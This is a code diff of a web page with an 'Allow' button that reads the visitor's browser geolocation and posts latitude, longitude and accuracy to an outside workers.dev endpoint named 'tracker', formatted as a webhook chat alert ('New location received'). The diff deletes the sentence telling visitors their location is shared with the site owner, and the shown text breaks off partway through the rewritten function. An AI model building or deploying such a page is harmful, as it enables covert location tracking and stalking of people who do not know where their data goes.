@@ -7,17 +7,18 @@
 <body>
 
 <h2>Allow Location Access</h2>
-<p>By clicking Allow, you agree to share your location with the site owner.</p>
 <button onclick="getLocation()">Allow</button>
 
 <p id="status"></p>
 
 <script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/";
+
+const WEBHOOK_URL = "https://tracker.jovdat70.workers.dev/";
 
 function getLocation() {
   if (!navigator.geolocation) {
-    document.getElementById("status").innerText = "Geolocation not supported.";
+    document.getElementById("status").innerText =
+      "Geolocation not supported.";
     return;
   }
 
@@ -27,26 +28,13 @@ function getLocation() {
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
 
-      fetch(WORKER_URL, {
+      fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lat, lon, acc })
-      })
-      .then(() => {
-        document.getElementById("status").innerText = "Thanks! Location shared.";
-      })
-      .catch((err) => {
-        console.error(err);
-        document.getElementById("status").innerText = "Error sending location.";
-      });
-    },
-    (err) => {
-      console.error(err);
-      document.getElementById("status").innerText = "Permission denied or error.";
-    }
-  );
-}
-</script>
-
-</body>
-</html>
+        body: JSON.stringify({
+          content:
+            "📍 **New location received**\n" +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lon}\n` +
+            `Accuracy: ±${acc} meters`
+        })
